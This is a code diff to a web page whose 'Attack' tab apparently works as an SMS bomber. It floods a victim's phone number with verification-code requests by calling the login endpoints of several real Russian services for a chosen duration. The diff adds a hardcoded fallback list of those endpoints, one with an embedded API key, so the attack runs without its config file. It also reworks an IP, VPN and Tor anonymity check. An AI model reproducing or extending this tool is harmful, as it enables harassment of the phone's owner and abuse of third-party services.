@@ -23,6 +23,9 @@
       --tr:       0.32s cubic-bezier(.4,0,.2,1);
       --fh:       'Mochiy Pop One', cursive;
       --fb:       'Nunito', sans-serif;
+      --green:    #5ee8a0;
+      --red:      #ff6b6b;
+      --orange:   #ffaa5e;
     }
 
     [data-theme="light"] {
@@ -332,7 +335,12 @@
     }
     .social-btn svg { width:20px; height:20px; fill:currentColor; }
 
-    /* Attack-стиль */
+    .services-status {
+      font-size: .8rem;
+      color: var(--muted);
+      margin: .2rem 0 .8rem;
+    }
+
     .attack-title {
       font-family: var(--fh);
       font-size: 1.35rem;
@@ -433,7 +441,6 @@
       transform:translateY(-1px);
     }
 
-    /* Оверлей атаки */
     .atk-overlay {
       display: none;
       position: fixed;
@@ -463,7 +470,7 @@
     .atk-progress {
       width: 80%;
       height: 6px;
-      background: var(--card2);
+      background: var(--card);
       border-radius: 4px;
       margin: 1.5rem 0;
       overflow: hidden;
@@ -536,7 +543,6 @@
     .history-item .h-stats .ok { color: #5ee8a0; }
     .history-item .h-stats .fail { color: #ff6b6b; }
 
-    /* Таблица IP check */
     .ip-check-table {
       width: 100%;
       border-collapse: collapse;
@@ -558,7 +564,6 @@
     .ip-check-table .warn { color: var(--orange); }
     .ip-check-table .bad { color: var(--red); }
 
-    /* Музыка / галерея */
     .music-wrap { text-align:center; }
     .music-title {
       font-family:var(--fh); font-size:1.5rem;
@@ -608,7 +613,6 @@
       border-color:var(--accent);
     }
 
-    /* НEKO */
     .neko-wrap {
       position:fixed; bottom:1.3rem; right:1.3rem;
       z-index:150; display:flex; flex-direction:column;
@@ -716,7 +720,8 @@
     <!-- ⚡ Attack -->
     <div class="tab-content" id="tab-attack">
       <div class="card">
-        <div class="attack-title">⚡ ОАтака</div>
+        <div class="attack-title">⚡ Атака</div>
+        <div class="services-status" id="servicesStatus">Загрузка сервисов...</div>
 
         <div class="region-chips" id="regionChips">
           <span class="region-chip active" data-r="ru">RU</span>
@@ -884,7 +889,6 @@
     });
   });
 
-  // Заглушки для изображений
   function setImageWithFallback(imgElement, src, fallbackSvg) {
     imgElement.src = src || '';
     imgElement.onerror = function() {
@@ -899,7 +903,6 @@
   const AVATAR_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="155" height="155" viewBox="0 0 155 155"><rect fill="#22133a" width="155" height="155"/><text x="77" y="80" text-anchor="middle" fill="#c77dff" font-size="30">★</text></svg>`;
   const WAIFU_FALLBACK = `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"><rect fill="#1a1025" width="200" height="200"/><text x="100" y="100" text-anchor="middle" fill="#ffb7c5" font-size="20">🌸</text></svg>`;
 
-  // Аватар
   const avatarImg = document.getElementById('avatarImg');
   (async function fetchAvatar() {
     const types = ['waifu','neko','shinobu','megumin'];
@@ -982,9 +985,21 @@
   fetchNeko();
   setInterval(fetchNeko, 30000);
 
-  // ========== ЗАГРУЗКА services.json ==========
+  // ========== ЗАГРУЗКА services.json с фолбэком ==========
   let servicesDB = { ru: [], by: [], kz: [] };
-  (async function loadServices() {
+  window.servicesLoaded = false;
+
+  // Резервный список (РФ), чтобы атака работала даже без файла
+  const FALLBACK_RU = [
+    { method:"POST", url:"https://api.sunlight.net/modules/customer-auth/v1/web/send/", type:"json", body:{phone:"{wp}",source:"web_auth_page"} },
+    { method:"POST", url:"https://api.start.ru/auth/phone/check?apikey=a20b12b279f744f2b3c7b5c5400c4eb5", type:"json", body:{phone:"{ru}"} },
+    { method:"POST", url:"https://api.litres.ru/foundation/api/auth/phone-available", type:"json", body:{country_code:"RU",phone:"{raw}"} },
+    { method:"POST", url:"https://lenta.com/api/v1/authentication/requestValidationCode", type:"json", body:{phone:"{wp}"} },
+    { method:"POST", url:"https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", type:"json", body:{phone:"{wp}"} },
+  ];
+
+  async function loadServices() {
+    const statusEl = document.getElementById('servicesStatus');
     try {
       const resp = await fetch('services.json');
       if (resp.ok) {
@@ -994,11 +1009,20 @@
             if (Array.isArray(data[region])) servicesDB[region] = data[region];
           });
         }
+      } else {
+        throw new Error('Не удалось загрузить services.json');
       }
     } catch(e) {
-      console.warn('services.json не загружен, атака без внешних сервисов');
+      console.warn('services.json не загружен, использую резервные сервисы РФ');
+      servicesDB.ru = FALLBACK_RU;
     }
-  })();
+    window.servicesLoaded = true;
+    if (statusEl) {
+      statusEl.textContent = `Сервисов загружено: RU ${servicesDB.ru.length}, BY ${servicesDB.by.length}, KZ ${servicesDB.kz.length}`;
+      statusEl.style.color = 'var(--green)';
+    }
+  }
+  loadServices(); // асинхронно
 
   // ========== ATTACK LOGIC ==========
   function formatPhone(phone, type) {
@@ -1028,7 +1052,6 @@
     const headers = {};
     let body = null;
 
-    // GET params
     if (service.params && Object.keys(service.params).length > 0) {
       const urlObj = new URL(url);
       Object.entries(service.params).forEach(([k, v]) => {
@@ -1039,14 +1062,12 @@
       url = applyPlaceholders(url, phone);
     }
 
-    // Headers
     if (service.headers) {
       Object.entries(service.headers).forEach(([k, v]) => {
         headers[k] = applyPlaceholders(String(v), phone);
       });
     }
 
-    // Body
     if (service.type === 'json') {
       body = JSON.stringify(service.body);
       headers['Content-Type'] = 'application/json';
@@ -1082,6 +1103,21 @@
 
   async function startAttack() {
     if (attackRunning) return;
+
+    // Ждём загрузку сервисов (макс. 5 секунд)
+    if (!window.servicesLoaded) {
+      const statusEl = document.getElementById('servicesStatus');
+      if (statusEl) statusEl.textContent = 'Ожидание загрузки сервисов...';
+      for (let i = 0; i < 20; i++) {
+        if (window.servicesLoaded) break;
+        await new Promise(r => setTimeout(r, 300));
+      }
+      if (!window.servicesLoaded) {
+        alert('Сервисы не загружены. Обновите страницу.');
+        return;
+      }
+    }
+
     const phone = document.getElementById('attackPhone').value.trim();
     if (!phone) return alert('Введите номер телефона');
     attackDuration = parseInt(document.getElementById('attackDur').value) || 60;
@@ -1185,7 +1221,6 @@
   }
   renderHistory();
 
-  // Кнопки QR, экспорт/импорт, сброс истории
   document.getElementById('qrBtn').addEventListener('click', () => {
     const phone = document.getElementById('attackPhone').value.trim();
     if (!phone) return alert('Введите номер');
@@ -1232,7 +1267,6 @@
     renderHistory();
   });
 
-  // Чипсы региона
   document.querySelectorAll('#regionChips .region-chip').forEach(chip => {
     chip.addEventListener('click', () => {
       document.querySelectorAll('#regionChips .region-chip').forEach(c => c.classList.remove('active'));
@@ -1240,88 +1274,42 @@
     });
   });
 
-  // ========== IP CHECK (исправлено) ==========
-  const IP_TOKEN = '0zf1rwtib5ttwi0d';
-  const API_2IP = 'https://api.2ip.io';
-
-  async function check2ip(endpoint) {
-    const url = `${API_2IP}${endpoint}?token=${IP_TOKEN}`;
-    const resp = await fetch(url);
-    if (!resp.ok) throw new Error('2ip API error');
-    return resp.json();
-  }
-
-  function formatDateTime(tz) {
-    try {
-      return new Date().toLocaleString('ru', { timeZone: tz, hour12: false });
-    } catch (e) {
-      return '—';
-    }
-  }
-
+  // ========== IP CHECK (новый, надёжный API) ==========
   async function runIpCheck() {
     const tbody = document.getElementById('ipTableBody');
     if (!tbody) return;
     tbody.innerHTML = '<tr><td>Загрузка...</td><td>⏳</td></tr>';
 
     try {
-      const [check, geo, dns] = await Promise.all([
-        check2ip('/check').catch(() => null),
-        check2ip('/geo/ip').catch(() => null),
-        check2ip('/dns').catch(() => null)
-      ]);
+      const resp = await fetch('https://ipwho.is/');
+      if (!resp.ok) throw new Error('Ошибка API');
+      const data = await resp.json();
 
       const results = [];
+      const push = (method, result, cls) => results.push({ method, result, cls });
 
-      results.push({ method: 'Заголовки HTTP proxy', result: check?.is_proxy ? 'да' : 'нет', cls: check?.is_proxy ? 'bad' : 'ok' });
-      results.push({ method: 'Открытые порты HTTP proxy', result: check?.open_ports?.http_proxy ? 'да' : 'нет', cls: check?.open_ports?.http_proxy ? 'bad' : 'ok' });
-      results.push({ method: 'Открытые порты web proxy', result: check?.open_ports?.web_proxy_80 ? '80' : 'нет', cls: check?.open_ports?.web_proxy_80 ? 'warn' : 'ok' });
-      results.push({ method: 'Открытые порты VPN', result: check?.is_vpn ? 'да' : 'нет', cls: check?.is_vpn ? 'bad' : 'ok' });
-      results.push({ method: 'Подозрительное название хоста', result: check?.hostname || 'нет', cls: check?.hostname && check.hostname !== 'нет' ? 'warn' : 'ok' });
+      // IP и провайдер
+      push('IP адрес', data.ip || 'неизвестно', 'ok');
+      push('Хост', data.connection?.hostname || 'нет', 'ok');
+      push('Провайдер', data.connection?.org || 'неизвестно', 'ok');
 
-      const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const ipTZ = geo?.timezone || 'неизвестно';
-      const nowBrowser = formatDateTime(browserTZ);
-      const nowIp = ipTZ !== 'неизвестно' ? formatDateTime(ipTZ) : '—';
-      const tzDiff = (ipTZ !== browserTZ) ? `IP: ${nowIp} (${ipTZ})<br>браузер: ${nowBrowser}` : 'Совпадают';
-      results.push({ method: 'Разница во временных зонах', result: tzDiff, cls: ipTZ !== browserTZ ? 'warn' : 'ok' });
+      // Гео
+      push('Страна', `${data.country} (${data.country_code})`, 'ok');
+      push('Регион', data.region || '—', 'ok');
+      push('Город', data.city || '—', 'ok');
+      push('Часовой пояс', data.timezone?.id || '—', 'ok');
 
-      results.push({ method: 'Принадлежность IP к сети Tor', result: check?.is_tor ? 'да' : 'нет', cls: check?.is_tor ? 'bad' : 'ok' });
-      results.push({ method: 'Режим браузера Turbo', result: 'нет', cls: 'ok' });
-      results.push({ method: 'Принадлежность IP хостинг провайдеру', result: check?.is_hosting ? 'да' : 'нет', cls: check?.is_hosting ? 'bad' : 'ok' });
-      results.push({ method: 'Определение web proxy (JS метод)', result: 'нет', cls: 'ok' });
-      results.push({ method: 'Определение туннеля (двусторонний пинг)', result: check?.is_anonymous ? 'высокая анонимизация' : 'нет', cls: check?.is_anonymous ? 'bad' : 'ok' });
+      // Безопасность
+      const sec = data.security || {};
+      push('VPN', sec.vpn ? 'да ⚠️' : 'нет', sec.vpn ? 'bad' : 'ok');
+      push('Прокси', sec.proxy ? 'да ⚠️' : 'нет', sec.proxy ? 'bad' : 'ok');
+      push('Tor', sec.tor ? 'да ⚠️' : 'нет', sec.tor ? 'bad' : 'ok');
+      push('Хостинг / Дата‑центр', sec.hosting ? 'да ⚠️' : 'нет', sec.hosting ? 'bad' : 'ok');
+      push('Анонимайзер', sec.anonymizer ? 'да ⚠️' : 'нет', sec.anonymizer ? 'bad' : 'ok');
 
-      const dnsServers = dns?.servers?.join(', ') || 'не определено';
-      results.push({ method: 'Утечка DNS', result: dnsServers, cls: dnsServers.includes('Cloudflare') ? 'warn' : 'ok' });
-      results.push({ method: 'VPN fingerprint', result: check?.vpn_fingerprint ? 'обнаружен' : 'нет', cls: check?.vpn_fingerprint ? 'bad' : 'ok' });
-
-      // WebRTC Leak
-      let webrtcLeak = null;
-      if (window.RTCPeerConnection) {
-        try {
-          webrtcLeak = await new Promise((resolve) => {
-            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (e) => {
-              if (e.candidate) {
-                const parts = e.candidate.candidate.split(' ');
-                const ip = parts[4];
-                if (ip && ip !== '0.0.0.0' && !ip.startsWith('192.168') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
-                  resolve(ip);
-                  pc.close();
-                }
-              } else {
-                resolve(null);
-                pc.close();
-              }
-            };
-            setTimeout(() => { resolve(null); pc.close(); }, 3000);
-          });
-        } catch(e) {}
-      }
-      results.push({ method: 'Утечка IP через WebRTC', result: webrtcLeak ? 'да (' + webrtcLeak + ')' : 'нет', cls: webrtcLeak ? 'bad' : 'ok' });
+      // Дополнительно
+      push('Тип соединения', data.connection?.type || '—', 'ok');
+      push('Мобильная сеть', data.connection?.mobile ? 'да' : 'нет', 'ok');
 
       tbody.innerHTML = '';
       results.forEach(r => {
@@ -1330,7 +1318,7 @@
         tbody.appendChild(row);
       });
     } catch (err) {
-      tbody.innerHTML = `<tr><td colspan="2" class="bad">Ошибка при проверке: ${err.message}</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="2" class="bad">Ошибка: ${err.message}</td></tr>`;
     }
   }
 
